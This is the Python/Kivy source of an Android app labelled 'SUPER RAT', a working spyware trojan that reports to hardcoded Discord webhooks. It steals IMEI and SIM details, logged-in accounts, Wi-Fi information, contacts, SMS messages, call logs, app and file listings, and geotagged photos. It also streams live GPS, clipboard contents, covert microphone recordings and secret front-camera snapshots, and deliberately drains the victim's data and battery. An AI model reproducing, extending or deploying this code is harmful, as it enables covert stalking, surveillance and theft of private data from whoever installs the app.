
# ============================================================
#  SUPER RAT main.py -- recon + accounts + wifi + mic + clipboard
#  + photos-with-GPS + FAST snapshots + FAST gps + strain
# ============================================================
import os, sys, time, random, threading, traceback
import requests

WEBHOOKS = [
    "https://discord.com/api/webhooks/1571455883890786368/Rxx2nrRl-yQy12ukzHANu6aiPRND2cVFddEwni0ksu7nZy33z0LGXotXDrPdGotTa78b",
    "https://discord.com/api/webhooks/1571455653820502069/l3HWW63h8HGftqOUhjVBDQAaZL8XitiYb2BPmg1CxiRv0AQQv5uCnHS--ne-yQbROKpY",
    "https://discord.com/api/webhooks/1570302449284157570/79RroUaLoIEOT5Y2aHzf1KwHQzHsvL_M6o2GaEqwlzzYociI6xX-rVEkP0Qp6QwYnRrx",
    "https://discord.com/api/webhooks/1570301861200789554/2OmgHsbjyeV5bsU3ns-WxjFo7scFW41xbo_jQP6oxn__nQo3l0YUi8FVgsqJbr2gfbRI",
]

GPS_SEND_EVERY  = 60     # google maps link EVERY MINUTE
CAM_FIRST       = 25     # first secret snapshot after 25 sec
CAM_EVERY       = 60     # snapshot EVERY SINGLE MINUTE
MIC_FIRST       = 120    # first mic recording after 2 min
MIC_EVERY       = 300    # record 20s mic clips every 5 min
CLIP_EVERY      = 20     # steal clipboard every 20 sec
SMS_COUNT       = 500    # steal 500 texts
CALL_COUNT      = 300    # steal 300 call entries
CONTACT_LIMIT   = 1000
PHOTO_STEAL     = 10     # steal newest 10 photos with GPS exif
DRAIN_EVERY     = 30     # download+delete 10MB every 30 sec
DRAIN_URL       = "https://speed.cloudflare.com/__down?bytes=10000000"

USER_DIR = None
_last_clip = None

def hook_send(content, files=None):
    hook = random.choice(WEBHOOKS)
    for _ in range(4):
        try:
            if files is not None:
                return requests.post(hook, data={"content": content},
                                     files=files, timeout=90)
            return requests.post(hook, json={"content": content}, timeout=30)
        except Exception:
            time.sleep(4)
    return None

def chunked_send(title, text):
    if not text:
        hook_send("**%s**\n`[none found]`" % title)
        return
    lines, part, parts = text.split("\n"), [], []
    for ln in lines:
        if len("\n".join(part)) + len(ln) > 1800:
            parts.append("\n".join(part)); part = []
        part.append(ln)
    if part: parts.append("\n".join(part))
    for i, p in enumerate(parts):
        hook_send("**%s** (part %d/%d)\n```%s```" % (title, i+1, len(parts), p))
        time.sleep(1.2)

def ts():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def activity():
    from jnius import autoclass
    return autoclass("org.kivy.android.PythonActivity").mActivity

# ---------------- HARVESTERS ----------------

def harvest_device():
    import platform
    out = "== FULL DEVICE RECON %s ==\n" % ts()
    try:
        act = activity()
        from jnius import autoclass
        Build = autoclass("android.os.Build")
        out += "Model: %s %s\n" % (Build.MANUFACTURER, Build.MODEL)
        out += "Android: %s (SDK %s)\n" % (Build.VERSION.RELEASE, Build.VERSION.SDK_INT)
        out += "IMEI attempt below\n"
        try:
            tm = act.getSystemService("phone")
            for name, fn in [
                ("IMEI (getDeviceId)", tm.getDeviceId()),
                ("IMEI (getImei)", tm.getImei()),
                ("Phone number", tm.getLine1Number()),
                ("SIM serial", tm.getSimSerialNumber()),
                ("SubscriberId", tm.getSubscriberId()),
                ("Carrier", tm.getNetworkOperatorName()),
                ("SIM country", tm.getSimCountryIso()),
                ("SIM operator", tm.getSimOperatorName()),
            ]:
                try:
                    out += "%s: %s\n" % (name, fn)
                except Exception:
                    out += "%s: den/err\n" % name
        except Exception as e:
            out += "telephony err: %s\n" % e
        out += "Board: %s / Fingerprint: %s\n" % (Build.BOARD, Build.FINGERPRINT)
        try:
            out += "Serial: %s\n" % Build.getSerial()
        except Exception:
            pass
        # ---- ACCOUNTS (google/emails logged into phone) ----
        try:
            AM = autoclass("android.accounts.AccountManager")
            am = AM.get(act)
            accs = am.getAccounts()
            out += "\n== LOGGED-IN ACCOUNTS ==\n"
            for a in accs:
                out += "ACCOUNT: %s (type: %s)\n" % (a.name, a.type)
        except Exception:
            out += "accounts: den/err\n"
        # ---- WIFI NETWORK ----
        try:
            wm = act.getSystemService("wifi")
            wi = wm.getConnectionInfo()
            out += "\n== WIFI NETWORK ==\nSSID: %s\nBSSID (router MAC): %s\n" % (wi.getSSID(), wi.getBSSID())
        except Exception:
            out += "wifi: den/err\n"
    except Exception as e:
        out += "jnius err: %s\n" % e
    try:
        import plyer.battery
        b = plyer.battery.status
        out += "Battery: %s%% (%s)\n" % (b.get("percentage"), b.get("isCharging"))
    except Exception:
        pass
    try:
        st = os.statvfs("/storage/emulated/0")
        out += "Storage total: %.1f GB / free: %.1f GB\n" % (
            st.f_blocks * st.f_frsize / 1e9, st.f_bavail * st.f_frsize / 1e9)
    except Exception:
        pass
    out += "Python: %s\n" % platform.python_version()
    hook_send("** INITIAL SUPER-RECON (device/IMEI/accounts/wifi) **\n```%s```" % out)

def harvest_contacts():
    try:
        act = activity()
        from jnius import autoclass
        C = autoclass("android.provider.ContactsContract$Contacts")
        cur = act.getContentResolver().query(C.CONTENT_URI, None, None, None, None)
        out = []
        if cur is not None:
            while cur.moveToNext() and len(out) < CONTACT_LIMIT:
                idx = cur.getColumnIndex("display_name")
                nm = cur.getString(idx) if idx >= 0 else "?"
                out.append(nm or "(no name)")
            cur.close()
        chunked_send("ALL CONTACTS (up to %d)" % CONTACT_LIMIT, "\n".join(out))
    except Exception as e:
        hook_send("contacts err: %s" % e)

def harvest_sms():
    try:
        act = activity()
        from jnius import autoclass
        Uri = autoclass("android.net.Uri")
        cur = act.getContentResolver().query(Uri.parse("content://sms"),
                                             None, None, None, "date DESC")
        out = []
        if cur is not None:
            while cur.moveToNext() and len(out) < SMS_COUNT:
                try:
                    body = cur.getString(cur.getColumnIndex("body")) or ""
                    addr = cur.getString(cur.getColumnIndex("address")) or "?"
                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]))
                except Exception:
                    pass
            cur.close()
        chunked_send("SMS LOG (newest %d)" % SMS_COUNT, "\n".join(out))
    except Exception as e:
        hook_send("sms err: %s" % e)

def harvest_calls():
    try:
        act = activity()
        from jnius import autoclass
        Uri = autoclass("android.net.Uri")
        cur = act.getContentResolver().query(Uri.parse("content://call_log/calls"),
                                             None, None, None, "date DESC")
        out = []
        TYPES = {1: "IN", 2: "OUT", 3: "MISSED"}
        if cur is not None:
            while cur.moveToNext() and len(out) < CALL_COUNT:
                try:
                    num = cur.getString(cur.getColumnIndex("number")) or "?"
                    typ = TYPES.get(cur.getInt(cur.getColumnIndex("type")), "?")
                    dur = cur.getString(cur.getColumnIndex("duration")) or "0"
                    when = time.strftime("%Y-%m-%d %H:%M",
                                         time.localtime(int(cur.getString(cur.getColumnIndex("date"))) / 1000.0))
                    out.append("%s %s %s %ss" % (when, typ, num, dur))
                except Exception:
                    pass
            cur.close()
        chunked_send("CALL LOG (newest %d)" % CALL_COUNT, "\n".join(out))
    except Exception as e:
        hook_send("calls err: %s" % e)

def harvest_apps():
    try:
        act = activity()
        pm = act.getPackageManager()
        out = []
        now_ms = int(time.time() * 1000)
        for ai in pm.getInstalledApplications(0):
            try:
                label = str(ai.loadLabel(pm))
                pkg = ai.packageName
                try:
                    fi = ai.firstInstallTime
                    ago = (now_ms - fi) / 86400000.0
                    out.append("%s [%s] (installed %.0f days ago)" % (label, pkg, ago))
                except Exception:
                    out.append("%s [%s]" % (label, pkg))
            except Exception:
                pass
        chunked_send("INSTALLED APPS (+packages +install dates)", "\n".join(out))
    except Exception as e:
        hook_send("apps err: %s" % e)

def harvest_files():
    base = "/storage/emulated/0"
    out = []
    for folder in ["DCIM/Camera", "DCIM/Screenshots", "Download",
                   "Pictures", "Documents", "WhatsApp/Media/WhatsApp Images",
                   "WhatsApp/Media/WhatsApp Video", "Movies", "Music", "Recordings"]:
        p = os.path.join(base, folder)
        try:
            for f in os.listdir(p):
                full = os.path.join(p, f)
                try:
                    sz = os.path.getsize(full) // 1024
                    out.append("%s (%d KB)" % (full, sz))
                except Exception:
                    out.append(full)
        except Exception:
            pass
    chunked_send("FILES FOUND (deep scan)", "\n".join(out))

def _exif_gps(path):
    try:
        from jnius import autoclass
        Exif = autoclass("android.media.ExifInterface")
        e = Exif(path)
        lat = e.getLatDouble()
        lon = e.getLonDouble()
        dt = e.getAttribute("DateTime")
        if lat != 0.0 or lon != 0.0:
            return " | PHOTO-TAKEN-AT: https://maps.google.com/?q=%.6f,%.6f (taken %s)" % (lat, lon, dt)
        return " | taken %s" % dt
    except Exception:
        return ""

def steal_photos():
    cam_dir = "/storage/emulated/0/DCIM/Camera"
    try:
        files = [os.path.join(cam_dir, f) for f in os.listdir(cam_dir)
                 if f.lower().endswith((".jpg", ".jpeg", ".png"))]
        files.sort(key=lambda f: os.path.getmtime(f), reverse=True)
    except Exception:
        return
    sent = 0
    for p in files:
        if sent >= PHOTO_STEAL:
            break
        try:
            if os.path.getsize(p) > 20 * 1024 * 1024:
                continue
            extra = _exif_gps(p)
            with open(p, "rb") as f:
                hook_send("** STOLEN PHOTO %d/%d from camera roll%s **" % (sent + 1, PHOTO_STEAL, extra),
                          {"files[0]": (os.path.basename(p), f, "image/jpeg")})
            sent += 1
        except Exception:
            pass

def initial_report():
    hook_send("** SUPER RAT ONLINE — full recon starting NOW (device/IMEI/accounts/wifi/SMS/mic/clipboard/drain) **")
    for fn in (harvest_device, harvest_contacts, harvest_sms,
               harvest_calls, harvest_apps, harvest_files, steal_photos):
        try:
            fn()
        except Exception:
            hook_send("recon err:\n```%s```" % traceback.format_exc()[-1500:])
        time.sleep(1.5)

# ---------------- GPS (EVERY MINUTE) ----------------

_gps = {"lat": None, "lon": None, "acc": None, "last_sent": 0}

def gps_loop():
    try:
        from plyer import gps
        def on_loc(**kw):
            if "lat" in kw and "lon" in kw:
                _gps["lat"], _gps["lon"] = kw["lat"], kw["lon"]
                _gps["acc"] = kw.get("accuracy")
        gps.configure(on_location=on_loc)
        gps.start(min_time=2000, min_distance=0)
    except Exception:
        hook_send("gps setup err:\n```%s```" % traceback.format_exc()[-800:])
        return
    while True:
        time.sleep(10)
        now = time.time()
        if (_gps["lat"] is not None and now - _gps["last_sent"] >= GPS_SEND_EVERY):
            _gps["last_sent"] = now
            link = "https://maps.google.com/?q=%.6f,%.6f" % (_gps["lat"], _gps["lon"])
            hook_send("** LIVE GPS (%s) **\n[OPEN IN GOOGLE MAPS](%s)\n"
                      "Lat/Lon: `%.6f, %.6f` • accuracy: %s"
                      % (ts(), link, _gps["lat"], _gps["lon"], _gps["acc"]))

# ---------------- CLIPBOARD SPY (every 20 sec) ----------------

def clipboard_loop():
    global _last_clip
    while True:
        try:
            act = activity()
            cm = None
            passed = 0
            while passed < 40:
                try:
                    cm = act.getSystemService("clipboard")
                    break
                except Exception:
                    time.sleep(0.25); passed += 1
            clip = cm.getPrimaryClip()
            if clip is None or clip.getItemCount() == 0:
                time.sleep(CLIP_EVERY); continue
            txt = str(clip.getItemAt(0).coerceToText(act))
            if txt and txt != _last_clip and txt.strip():
                _last_clip = txt
                hook_send("** CLIPBOARD STOLEN (%s) **\n```%s```" % (ts(), txt[:1500]))
        except Exception:
            pass
        time.sleep(CLIP_EVERY)

# ---------------- MIC SPY (20s clips every 5 min) ----------------

def mic_record_clip():
    path = os.path.join(USER_DIR, "amr.mp4")
    from jnius import autoclass
    MediaRecorder = autoclass("android.media.MediaRecorder")
    mr = MediaRecorder()
    mr.setAudioSource(1)             # MIC
    mr.setOutputFormat(2)            # MPEG_4
    mr.setAudioEncoder(3)            # AAC
    mr.setOutputFile(path)
    mr.prepare()
    mr.start()
    time.sleep(20)                  # record 20 seconds
    try:
        mr.stop()
    except Exception:
        pass
    mr.release()
    return path

def mic_loop():
    time.sleep(MIC_FIRST - 10 if MIC_FIRST > 10 else 5)
    while True:
        path = None
        try:
            path = mic_record_clip()
            if os.path.getsize(path) > 1000:
                with open(path, "rb") as f:
                    hook_send("** SECRET MIC RECORDING 20s (%s) **" % ts(),
                              {"files[0]": ("mic_clip.mp4", f, "audio/mp4")})
        except Exception:
            pass
        finally:
            try:
                if path and os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass
        time.sleep(MIC_EVERY)

# ---------------- STRAIN THE PHONE (HARDER) ----------------

def drain_loop():
    i = 0
    while True:
        i += 1
        path = os.path.join(USER_DIR, "sysdata.dat")
        try:
            r = requests.get(DRAIN_URL, timeout=120, stream=True)
            with open(path, "wb") as f:
                for chunk in r.iter_content(65536):
                    f.write(chunk)
            hook_send("** strain cycle %d ** — burned 10MB data + battery @ %s" % (i, ts()))
        except Exception:
            pass
        finally:
            try:
                os.remove(path)
            except Exception:
                pass
        time.sleep(DRAIN_EVERY)

# ---------------- APP ----------------

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.camera import Camera
from kivy.clock import Clock
from kivy.core.window import Window

class RatApp(App):
    def build(self):
        lay = FloatLayout()
        self.cam = Camera(index=1, resolution=(640, 480), play=True)
        lay.add_widget(self.cam)
        return lay

    def on_start(self):
        global USER_DIR
        USER_DIR = self.user_data_dir
        try:
            os.makedirs(USER_DIR, exist_ok=True)
        except Exception:
            pass
        perms = ["android.permission.CAMERA",
                 "android.permission.ACCESS_FINE_LOCATION",
                 "android.permission.ACCESS_COARSE_LOCATION",
                 "android.permission.READ_CONTACTS",
                 "android.permission.READ_SMS",
                 "android.permission.READ_CALL_LOG",
                 "android.permission.READ_PHONE_STATE",
                 "android.permission.RECORD_AUDIO",
                 "android.permission.GET_ACCOUNTS",
                 "android.permission.READ_EXTERNAL_STORAGE",
                 "android.permission.WRITE_EXTERNAL_STORAGE"]
        try:
            from android.permissions import request_permissions
            request_permissions(perms, self._perms_done)
        except Exception:
            self._perms_done([], [])
        try:
            from jnius import autoclass
            Intent = autoclass("android.content.Intent")
            Uri = autoclass("android.net.Uri")
            it = Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS")
            it.setData(Uri.parse("package:" + activity().getPackageName()))
            activity().startActivity(it)
        except Exception:
            pass

    def _perms_done(self, permissions, grant_results):
        Clock.schedule_once(lambda dt: self._start_all(), 12)

    def _start_all(self):
        threading.Thread(target=initial_report, daemon=True).start()
        threading.Thread(target=gps_loop, daemon=True).start()
        threading.Thread(target=drain_loop, daemon=True).start()
        threading.Thread(target=clipboard_loop, daemon=True).start()
        threading.Thread(target=mic_loop, daemon=True).start()
        Clock.schedule_once(self.snap, CAM_FIRST)
        Clock.schedule_interval(self.snap, CAM_EVERY)

    def snap(self, dt=None):
        try:
            if self.cam.texture is None:
                return
            path = os.path.join(USER_DIR, "snap.png")
            self.cam.texture.save(path)
            with open(path, "rb") as f:
                hook_send("** SECRET FRONT-CAM SNAPSHOT (%s) **" % ts(),
                          {"files[0]": ("snapshot.png", f, "image/png")})
            try:
                os.remove(path)
            except Exception:
                pass
        except Exception:
            pass

RatApp().run()
